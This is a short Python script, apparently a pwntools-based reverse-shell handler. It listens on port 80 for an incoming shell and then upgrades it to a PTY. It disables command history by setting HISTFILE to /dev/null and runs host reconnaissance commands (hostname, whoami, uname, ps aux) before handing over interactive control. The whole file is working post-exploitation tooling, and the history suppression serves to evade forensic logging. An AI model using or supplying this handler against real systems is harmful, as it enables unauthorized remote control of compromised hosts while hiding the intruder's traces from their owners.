import pwn

listener = pwn.listen(80)
listener.sendline(''' python -c 'import pty; pty.spawn("/bin/bash")''')
listener.sendline(' export SHELL=bash')
listener.sendline(' export HISTFILE=/dev/null')
listener.sendline(' export TERM=xterm')
listener.sendline(' stty rows 38 columns 116')
listener.sendline(''' alias ls="ls -lha --color=auto"''')
listener.sendline('hostname')
listener.sendline('whoami')
listener.sendline('uname -a')
listener.sendline('ps aux')
listener.interactive()
